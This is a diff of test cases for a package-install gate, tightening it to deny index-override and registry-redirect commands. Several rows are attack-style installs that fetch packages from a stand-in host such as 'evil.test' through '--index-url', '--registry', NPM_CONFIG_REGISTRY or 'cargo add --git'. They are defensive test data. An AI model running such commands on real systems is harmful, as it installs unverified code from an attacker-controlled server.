@@ -494,13 +494,27 @@ DEP = [
     ("NPM_CONFIG_REGISTRY=http://evil.test npm install gleeunit", 2),
     # [lens A F9] The value of a value-taking flag is not a package name.
     # Every one of these exited 2 at v2.6.0 AND named the wrong token in
-    # the reason string. They are the deliberate relaxations of this round.
-    ("pip install --index-url https://internal.example.com/simple gleeunit",
-     0),
-    ("pip install -i https://pypi.org/simple gleeunit", 0),
-    ("npm install --registry https://r.example.com gleeunit", 0),
+    # the reason string.
     ("pip install --no-binary :all: gleeunit", 0),
     ("pip install --target ./libs gleeunit", 0),
+    ("pip install --python-version 3.11 gleeunit", 0),
+    # [round-2 review F-1357] ...but an INDEX-OVERRIDE flag is not an
+    # ordinary value flag, and these three were allowed until 2026-07-29
+    # while the two environment-variable rows above - the identical attack,
+    # the identical reason string, the same file - were denied. The flag
+    # redirects even an APPROVED package to a server this gate cannot
+    # verify, so consuming its value and checking the package name proves
+    # nothing.
+    ("pip install --index-url https://internal.example.com/simple gleeunit",
+     2),
+    ("pip install -i https://pypi.org/simple gleeunit", 2),
+    ("npm install --registry https://r.example.com gleeunit", 2),
+    ("cargo add --git https://evil.test/repo", 2),
+    # [round-2 review F-1313] `0`, `1` and `2` are real npm packages, and
+    # `^[0-9.]+$` could not tell them from a version number.
+    ("npm install -f 0", 2),
+    ("npm install -p 1", 2),
+    ("npm i -w 2", 2),
     # ...but the inversion that makes that safe: a flag consumes its value
     # only when the value is value-SHAPED, so a short flag whose meaning
     # differs by ecosystem can never swallow a package name.
